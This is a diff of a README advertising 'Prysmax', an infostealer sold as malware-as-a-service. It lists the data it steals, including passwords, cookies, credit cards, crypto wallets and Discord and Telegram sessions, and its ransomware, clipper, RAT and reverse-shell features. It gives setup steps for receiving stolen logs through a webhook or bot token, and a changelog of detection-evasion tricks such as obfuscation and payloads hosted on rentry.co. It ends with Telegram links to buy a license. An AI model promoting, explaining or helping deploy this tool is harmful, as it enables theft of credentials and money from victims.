@@ -1,36 +1,74 @@
-Prysmax STEALER ❗️
-🚧 Project under development 🚧
-📢 Prysmax is one of the few original Stealers, with new methods of infiltration and theft.
-Russian, Chinese, English, and Spanish Stealer
-Telegram: t.me/lawxsz t.me/irisstealer
--------------------------------------------------------------------------------------------------------------------------------
+<h1 align="center">
+ https://t.me/prysmaxsoftware<br>
+ Prysmax STEALER ❗️
+</h1>
+<h4 align="center">
+:construction: Project under development :construction:
 
-☀️ 〢 Features
-Stealer
-🔑 Passwords 🍪 Cookies 💰 CreditCards 🍪 Bookmarks 📃 Historial 🌙 Exodus Wallet 📱 Telegram Session 📷 Screenshot 🎮 Discord Tokens 💬 +20 Browsers 📋 Tasklist - Antivirus log
-📸 〢 Screenshots
-Crypto clipper
-ransomware
-R.A.T 
-![image](https://github.com/user-attachments/assets/ca6abb38-0860-4ca1-b2da-3c123edd2279)
-![image](https://github.com/user-attachments/assets/672614ad-09d7-498e-ab61-9f202ed4da23)
-![image](https://github.com/user-attachments/assets/0541f863-80d1-4b1a-bd36-76fc095ab41c)
+- 📢 Prysmax is one of the few original Stealers, with new methods of infiltration and theft.
+- Russian, Chinese, English, and Spanish Stealer
+- Telegram: t.me/lawxsz t.me/irisstealer
+</h4>
 
-------------------------------------------------------------------------------------------------------------------------------
-📁 Setup
-You will need python, 3.10 recommended.
-start.bat to install requirements and automatic run setup.py
-Execute in a console: python setup.py if not work install requirements of start.bat
-You must put Webhook/Bot-token to receive logs
+<a id="features"></a>
+
+---
+
+### ☀️ 〢 Features
+
+#### Stealer
+>  🔑 Passwords
+>  🍪 Cookies
+>  💰 CreditCards
+>  🍪 Bookmarks
+>  📃 Historial
+>  🌙 Exodus Wallet
+>  📱 Telegram Session
+>  📷 Screenshot
+>  🎮 Discord Tokens
+>  💬 +20 Browsers
+>  📋 Tasklist - Antivirus log
+
+<a id="screenshot"></a>
+
+---
+### 📸 〢 Screenshots
+
+
+<img title="" src="https://i.imgur.com/MhB6LGz.png" alt="" width="539">
+
+<img title="" src="https://i.imgur.com/2BesbRq.png" alt="" width="539">
+
+<img title="" src="https://i.imgur.com/pqWCPxT.png" alt="" width="539">
+
+<img title="" src="https://i.imgur.com/wTHkezx.png" alt="" width="539">
+
+<img title="" src="https://i.imgur.com/qDZDVHB.png" alt="" width="539">
+
+
+<a id="todo"></a>
+---
+
+## 📁 Setup
+
+1. You will need python, 3.10 recommended.
+2. ```start.bat``` to install requirements and automatic run ```setup.py```
+3. Execute in a console: ```python setup.py``` if not work install requirements of ```start.bat```
+4. You must put ```Webhook/Bot-token``` to receive logs 
+
 If it does not work, install microsoft visual c++ redistributable and python 3.10.6
 
-🌟 〢 ChangeLog
+## <a id="changelog"></a>🌟 〢 ChangeLog
+
+```diff
+
 v1.5 ⋮ 2024-10-7
 + Password, cookies, browsers stealer fixed.
 + More languages were added to the builder, we now have Spanish, English, Russian, and Chinese.
-+ Obfuscation has been added 
++ Obfuscation has been added using the technology from https://github.com/Lawxsz/Py-obfuscator
 + Now the code is uploaded to rentry.co, and the victim retrieves it from there, thus evading more detections and making it more optimized.
--------------------------------------------------------------------------------------------------------------------------------
+
+
 v1.4 ⋮ 2024-10-4
 
 + Telegram Logs Added
@@ -57,25 +95,26 @@ v1.1 ⋮ 2023-11-20
 + File Stealer - You can steal files, you can choose whether to search through common folders or the entire computer.
 + Now the processes will be saved in a .txt file and it will show how many processes there are in telegram.
 + Code optimization
-✅ Prysmax PREMIUM & FUD
-There is no need for me to describe it, but the major media have already analyzed it.
+```
 
-CyFirma
+# ✅ `Prysmax PREMIUM & FUD`
 
-TheHackersNews
+- There is no need for me to describe it, but the major media have already analyzed it.
+
+- [CyFirma](https://www.cyfirma.com/outofband/new-maas-prysmax-launches-fully-undetectable-infostealer/)
+- [TheHackersNews](https://thehackernews.com/2023/09/new-hijackloader-modular-malware-loader.html)
 
 Prysmax is an advanced data stealer, be it wallets, sessions of all kinds and full remote control of victims' computers. But what sets it apart from the rest is that Prysmax is totally undetectable to all anti virus scanners on the market, as well as to virtual signature scanners like VirusTotal. Basically it is elusive to all detection methods which is why it is so dangerous and powerful.
 
-- 🔥 Wallets - 🔥 Passwords, Cookies, Historial, all Browsers
+-` 🔥 Wallets`
+-` 🔥 Passwords, Cookies, Historial, all Browsers`
+- `🔥 Telegram, Exodus, Discord, MobaXTerm, Metamask, Binance, Atom + 20 wallets`
+- `🔥 Screenshot, Steam, Roblox`
+- `🈴 Remote Access - RAT - Reverse Shell!`
 
-🔥 Telegram, Exodus, Discord, MobaXTerm, Metamask, Binance, Atom + 20 wallets
+- 💹 Currently the license is forever, with free upgrades! [Telegram Channel Prysmax](https://t.me/prysmax)
 
-🔥 Screenshot, Steam, Roblox
+- 🔱 Buy - Admin: Lawxsz [Telegram](https://t.me/lawxsz)
 
-🈴 Remote Access - RAT - Reverse Shell!
-
-💹 Currently the license is forever, with free upgrades! Telegram Channel Prysmax
-
-🔱 Buy - Admin 
-(https://t.me/stealeriumV2)
+![image](https://github.com/Lawxsz/prysmax/assets/116668706/a1707aa2-77b6-4653-9b9c-f713b274aa2a)
 
